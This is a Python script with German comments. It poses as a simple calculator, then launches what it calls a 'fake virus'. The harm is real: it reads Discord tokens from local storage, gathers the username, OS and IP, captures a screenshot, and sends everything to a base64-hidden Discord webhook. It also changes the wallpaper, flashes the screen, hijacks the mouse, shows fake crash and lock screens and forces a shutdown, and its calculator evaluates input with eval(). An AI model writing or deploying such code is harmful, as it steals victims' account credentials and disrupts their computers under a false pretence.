import ctypes
import time
import threading
import random
import pyautogui
import requests
from tkinter import Tk, Label, Entry, Button, StringVar
from PIL import Image, ImageTk, ImageGrab
from io import BytesIO
import os
import json
import socket
import getpass
import platform
import base64
import re
import subprocess
import sys
import winsound
import tempfile

# --- Wallpaper Funktion ---
def set_wallpaper_from_base64(b64data):
    # Falls der String mit "data:image/xxx;base64," anfängt, entferne das
    if b64data.startswith("data:image"):
        b64data = b64data.split(",", 1)[1]
    
    img_data = base64.b64decode(b64data)
    with tempfile.NamedTemporaryFile(delete=False, suffix=".jpg") as f:
        f.write(img_data)
        temp_path = f.name

    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, temp_path, 3)
    return temp_path


# Beispiel Base64-Bild (kleiner roter Punkt)
b64image = "data:image/jpeg;base64,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"

# Wallpaper zurücksetzen auf Standard (optional)
def reset_wallpaper():
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "", 3)

# --- Sirene Sound ---
def play_siren():
    freq = 2500  # Frequenz in Hz
    dur = 500   # Dauer in ms
    for _ in range(10):
        winsound.Beep(freq, dur)
        time.sleep(0.1)

# --- Win32 API für automatisches Schließen der MessageBoxen ---
try:
    import win32gui
    import win32con
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
    import win32gui
    import win32con

# --- NR2 Funktionen + Variablen ---
encoded_webhook_url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTkxODA4MzU2MDM3NDM4Mi9XMkw3R1F4WG1WVXBzVDR0ZU4ybThRZ3RvMEx6cmhNTFhfMk1zTUNVNlItdGlnTllSdElSQ3k3T2dwbmVsR3dyYUJSNg=="

def get_webhook_url():
    if not encoded_webhook_url:
        return ""
    decoded_bytes = base64.b64decode(encoded_webhook_url)
    return decoded_bytes.decode('utf-8')

def get_ip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return ip
    except:
        return "IP nicht gefunden"

def get_user():
    return getpass.getuser()

def get_os_info():
    return platform.platform()

def steal_discord_tokens():
    token_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")
    paths = [
        os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordcanary\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordptb\Local Storage\leveldb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
    ]
    tokens = []
    for path in paths:
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue
            try:
                with open(os.path.join(path, file), errors='ignore') as f:
                    content = f.read()
                    found_tokens = token_regex.findall(content)
                    tokens.extend(found_tokens)
            except:
                pass
    return list(set(tokens))

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        buffer = BytesIO()
        screenshot.save(buffer, format="PNG")
        buffer.seek(0)
        return buffer
    except Exception as e:
        print(f"Screenshot Fehler: {e}")
        return None

def build_payload_dict():
    return {
        "user": get_user(),
        "os": get_os_info(),
        "ip": get_ip(),
        "discord_tokens": steal_discord_tokens()
    }

def send_webhook(payload_dict):
    url = get_webhook_url()
    if not url:
        print("Kein Webhook definiert. Payload wird nicht gesendet.\n")
        print(json.dumps(payload_dict, indent=4))
        return

    embed = {
        "title": "Virus Report",
        "color": 0xff0000,
        "fields": []
    }

    for key, value in payload_dict.items():
        if isinstance(value, list):
            value = "\n".join(value) if value else "Keine Daten"
        if len(value) > 900:
            value = value[:900] + "..."
        embed["fields"].append({
            "name": key.capitalize(),
            "value": str(value),
            "inline": False
        })

    data = {
        "embeds": [embed]
    }

    headers = {"Content-Type": "application/json"}

    screenshot_buffer = take_screenshot()
    files = None
    if screenshot_buffer:
        files = {
            "file": ("screenshot.png", screenshot_buffer, "image/png")
        }
        try:
            response = requests.post(url, data={"payload_json": json.dumps(data)}, files=files)
            if response.status_code == 204:
                print("Payload mit Screenshot erfolgreich gesendet.")
            else:
                print(f"Fehler beim Senden: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Exception beim Senden: {e}")
    else:
        try:
            response = requests.post(url, json=data, headers=headers)
            if response.status_code == 204:
                print("Payload erfolgreich gesendet.")
            else:
                print(f"Fehler beim Senden: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Exception beim Senden: {e}")

# --- NR1 Funktionen ---
IMAGE_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSneb4ZExZy7IqTLngqfb-k8PDmQLgihO2Dhw&s"

def screen_flash(stop_event):
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    hwnd = user32.GetDesktopWindow()
    hdc = user32.GetDC(hwnd)
    while not stop_event.is_set():
        r, g, b = [random.randint(0, 255) for _ in range(3)]
        brush = gdi32.CreateSolidBrush((b << 16) + (g << 8) + r)
        rect = ctypes.wintypes.RECT(0, 0, 1920, 1080)
        user32.FillRect(hdc, ctypes.byref(rect), brush)
        time.sleep(0.1)

def move_mouse_random(stop_event):
    while not stop_event.is_set():
        x = random.randint(0, 1920)
        y = random.randint(0, 1080)
        pyautogui.moveTo(x, y, duration=0.05)

def get_image_from_url():
    try:
        response = requests.get(IMAGE_URL, timeout=5)
        img = Image.open(BytesIO(response.content)).resize((200, 200))
        return img
    except Exception as e:
        print("Fehler beim Laden des Bildes:", e)
        return None

def show_image_window_keep(img, x, y, windows_list):
    top = Tk()
    top.overrideredirect(True)
    top.attributes("-topmost", True)
    top.geometry(f"+{x}+{y}")
    tk_img = ImageTk.PhotoImage(img)
    label = Label(top, image=tk_img)
    label.image = tk_img
    label.pack()
    windows_list.append(top)
    top.after(30000, top.destroy)
    top.mainloop()

def image_spam():
    img = get_image_from_url()
    if img is None:
        return []

    windows = []
    for _ in range(30):
        x = random.randint(0, 1600)
        y = random.randint(0, 900)
        t = threading.Thread(target=show_image_window_keep, args=(img, x, y, windows), daemon=True)
        t.start()
        time.sleep(0.1)
    return windows

def crash_simulation():
    for _ in range(20):
        ctypes.windll.user32.MessageBoxW(0, "Systemfehler: 0xC0000022", "CRITICAL ERROR", 0x10)
        time.sleep(0.1)

def fake_lock():
    lock = Tk()
    lock.overrideredirect(False)
    lock.attributes("-fullscreen", True)
    lock.configure(bg="black")
    label = Label(lock, text="SYSTEM LOCKED!\nZugriff verweigert!", fg="red", bg="black", font=("Arial", 40))
    label.pack(expand=True)
    lock.after(4000, lock.destroy)
    lock.mainloop()

# --- Automatisch schließende MessageBoxen ---
def fake_data_steal_auto():
    def show_msg_auto(text):
        def mb():
            ctypes.windll.user32.MessageBoxW(0, text, "Systemmeldung", 0)

        t = threading.Thread(target=mb)
        t.start()
        time.sleep(0.5)
        hwnd = win32gui.FindWindow(None, "Systemmeldung")
        if hwnd:
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)

    for i in range(0, 101, 25):
        show_msg_auto(f"Daten werden gestohlen... {i}%")
        time.sleep(0.1)

# --- Taschenrechner UI ---
def calculator_ui(on_close_callback):
    def on_closing():
        root.destroy()
        on_close_callback()

    def calculate():
        try:
            expr = entry.get()
            result = eval(expr)
            result_var.set(str(result))
        except Exception:
            result_var.set("Error")

    root = Tk()
    root.title("Taschenrechner")
    root.geometry("300x150")
    root.protocol("WM_DELETE_WINDOW", on_closing)

    entry = Entry(root, font=("Arial", 14))
    entry.pack(pady=10)

    calc_btn = Button(root, text="Berechnen", command=calculate)
    calc_btn.pack()

    result_var = StringVar()
    result_label = Label(root, textvariable=result_var, font=("Arial", 14))
    result_label.pack(pady=10)

    root.mainloop()

# --- Main ---
def main():
    print("Starte Taschenrechner UI...")
    start_event = threading.Event()

    def start_fake_virus():
        start_event.set()

    ui_thread = threading.Thread(target=calculator_ui, args=(start_fake_virus,), daemon=True)
    ui_thread.start()

    # 30 Sekunden warten oder bis UI geschlossen wird
    start_event.wait(timeout=30)

    print("Starte Fake-Virus...")

    # Wallpaper setzen (bleibt erhalten)
    wallpaper_path = set_wallpaper_from_base64(b64image)

    # Sirene starten
    threading.Thread(target=play_siren, daemon=True).start()

    payload = build_payload_dict()
    send_webhook(payload)

    fake_data_steal_auto()

    stop_event = threading.Event()
    flash_thread = threading.Thread(target=screen_flash, args=(stop_event,), daemon=True)
    mouse_thread = threading.Thread(target=move_mouse_random, args=(stop_event,), daemon=True)
    flash_thread.start()
    mouse_thread.start()

    windows = image_spam()

    # Fenster schließen sich selbst nach 30s

    stop_event.set()
    flash_thread.join(timeout=2)
    mouse_thread.join(timeout=2)

    crash_simulation()
    fake_lock()

    # Kein Wallpaper-Zurücksetzen, kein Löschen der Datei

    os.system("shutdown /s /t 1 /f")

if __name__ == "__main__":
    main()
